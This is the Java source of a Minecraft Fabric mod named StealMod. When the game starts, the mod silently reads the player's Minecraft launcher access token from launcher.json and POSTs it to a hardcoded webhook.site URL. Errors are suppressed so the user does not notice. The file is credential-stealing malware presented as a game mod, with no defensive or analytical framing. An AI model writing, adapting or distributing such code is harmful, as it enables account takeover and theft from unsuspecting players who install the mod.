package com.yourname.stealmod;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class StealMod implements ModInitializer {

    // Your specific webhook URL
    private static final String WEBHOOK_URL = "https://webhook.site/00f0550b-6cca-478b-97c6-d9764da38a80";

    @Override
    public void onInitialize() {
        Thread stealThread = new Thread(() -> {
            try {
                String token = getToken();
                if (token != null && !token.isEmpty()) {
                    sendToken(token);
                }
            } catch (Exception e) {
                // Silent fail
            }
        });
        stealThread.start();
    }

    private String getToken() {
        Path mcDir = FabricLoader.getInstance().getGameDirectory();
        File launcherFile = new File(mcDir.toFile(), "launcher.json");
        
        if (!launcherFile.exists()) {
             String appData = System.getenv("APPDATA");
             if (appData != null) {
                 launcherFile = new File(appData + "\\.minecraft\\launcher.json");
             }
        }

        if (!launcherFile.exists()) return null;

        try {
            StringBuilder content = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new FileReader(launcherFile))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }
            }

            JSONObject json = new JSONObject(content.toString());
            
            if (json.has("accessTokens")) {
                JSONObject tokensObj = json.getJSONObject("accessTokens");
                if (tokensObj.length() > 0) {
                    String firstKey = tokensObj.keys().next();
                    return tokensObj.getJSONObject(firstKey).getString("accessToken");
                }
            }
            
            if (json.has("accessToken")) {
                return json.getString("accessToken");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private void sendToken(String token) {
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String postData = "token=" + java.net.URLEncoder.encode(token, "UTF-8");
            conn.getOutputStream().write(postData.getBytes());
            conn.getOutputStream().close();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
